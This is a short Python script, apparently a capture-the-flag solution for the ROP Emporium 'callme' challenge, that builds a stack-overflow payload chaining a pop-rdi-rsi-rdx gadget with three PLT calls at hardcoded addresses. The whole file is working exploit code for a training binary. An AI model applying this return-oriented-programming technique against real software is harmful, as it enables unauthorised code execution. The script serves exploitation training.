# NOTE: the process might crash when dumping the flag on some GLIBC implementations in buffered_vfprintf function
# this happened on Ubuntu with GLIBC 2.27-3ubuntu1

import struct

pop_rdi_rsi_rdx = 0x0000000000401ab0        # pop rdi; pop rsi; pop rdx; ret;
callme_one_plt = 0x0000000000401850
callme_two_plt = 0x0000000000401870
callme_three_plt = 0x0000000000401810

arg_one = 0x0000000000000001
arg_two = 0x0000000000000002
arg_three = 0x0000000000000003


p = "A"*40

p += struct.pack("<Q", pop_rdi_rsi_rdx)
p += struct.pack("<Q", arg_one)
p += struct.pack("<Q", arg_two)
p += struct.pack("<Q", arg_three)

p += struct.pack("<Q", callme_one_plt)

p += struct.pack("<Q", pop_rdi_rsi_rdx)
p += struct.pack("<Q", arg_one)
p += struct.pack("<Q", arg_two)
p += struct.pack("<Q", arg_three)

p += struct.pack("<Q", callme_two_plt)

p += struct.pack("<Q", pop_rdi_rsi_rdx)
p += struct.pack("<Q", arg_one)
p += struct.pack("<Q", arg_two)
p += struct.pack("<Q", arg_three)

p += struct.pack("<Q", callme_three_plt)

print(p)

